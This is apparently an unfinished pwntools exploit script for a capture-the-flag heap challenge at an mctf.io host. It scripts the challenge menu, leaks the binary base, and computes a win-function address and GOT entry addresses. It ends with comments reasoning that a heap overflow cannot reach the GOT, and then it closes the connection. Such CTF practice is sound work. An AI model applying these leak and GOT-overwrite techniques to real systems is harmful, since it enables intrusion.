from pwn import *

p = remote("kubenode.mctf.io", 31098)

def recv_menu():
    return p.recvuntil(b'> ')

def register(idx, count, size, data):
    p.sendline(b'1')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'Item count: ')
    p.sendline(str(count).encode())
    p.recvuntil(b'Item size (bytes): ')
    p.sendline(str(size).encode())
    p.recvuntil(b'data:\n')
    p.send(data)
    recv_menu()

def view(idx):
    p.sendline(b'2')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    res = p.recvuntil(b'\n\n===', drop=True)
    recv_menu()
    return res

def inspect(idx):
    p.sendline(b'3')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'Validator    : ')
    validator = int(p.recvline().strip(), 16)
    p.recvuntil(b'Checkpoint   : ')
    checkpoint = int(p.recvline().strip(), 16)
    recv_menu()
    return validator, checkpoint

def delete(idx):
    p.sendline(b'4')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    recv_menu()

recv_menu()
register(0, 1, 16, b'A'*16)
val, chk0 = inspect(0)
base_addr = val - 0x136c
win_func = base_addr + 0x14a8
print(f"Base: {hex(base_addr)}, Win: {hex(win_func)}")

puts_got = base_addr + 0x3600
printf_got = base_addr + 0x3620
free_got = base_addr + 0x35f8

# The program does NOT use full RELRO, so we can overwriteGOT.
# Wait, where is the array again? 0x3740.
# The GOT is at 0x35f8...0x3658.
# Both are in the data/bss segment!
# The heap block is at `chk0`. The GOT is at `puts_got` (an address inside the main binary!).
# Wait, our heap overflow goes upwards in the heap.
# Is the array allocated before the heap or after?
# The binary's data/bss is AT a lower address than the heap.
# Wait, NO! The heap is dynamically allocated. The bss is at base_addr + 0x3740.
# The heap usually starts at base_addr + something large, or via mmap.
# So we can't overflow from the heap into the bss!
p.close()
